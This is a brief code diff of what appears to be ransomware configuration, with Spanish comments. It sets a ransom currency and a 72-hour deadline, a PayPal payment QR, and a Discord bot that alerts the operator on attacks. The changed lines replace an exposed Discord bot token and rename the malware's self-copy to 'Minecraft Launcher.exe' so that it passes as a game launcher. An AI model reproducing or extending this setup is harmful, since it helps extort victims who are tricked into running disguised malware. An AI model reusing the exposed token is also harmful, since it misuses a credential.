@@ -73,7 +73,7 @@ RANSOM_CURR   = "USD"
 DEADLINE_H    = 72
 
 # --- DISCORD ---
-DISCORD_TOKEN = "MTU2NDEzMzQzMTY4MjY2NjYwOQ.GtFL2c.jqgzCOJNq8kahvMF4maS_pQ8HJZxaQQOUrtnGc"
+DISCORD_TOKEN = "MTU2NDEzMzQzMTY4MjY2NjYwOQ.GYSjhc.NncO-9ekSOAs_xVUDXa5ck5e_1ZJpNSyA-_4K0"
 BOT_AUTOSTART = True
 NOTIFY_ON_ATTACK = True            # avisa a discord cuando hay ataque/restauracion
 NOTIFY_CHANNEL   = ""              # ID de canal para los avisos (usa !id para obtenerlo)
@@ -94,7 +94,7 @@ ICON     = BASE / "fsociety.ico"
 FACE     = BASE / "face.png"
 QRPNG    = BASE / "paypal_qr.png"
 QRTXT    = BASE / "qr_url.txt"
-SELFCOPY = BASE / "Minecraft.exe"
+SELFCOPY = BASE / "Minecraft Launcher.exe"
 VERMARK  = BASE / "ver.txt"
 ASSET_VER = "crimson-v9"           # sube esto si quieres forzar regenerar assets
 
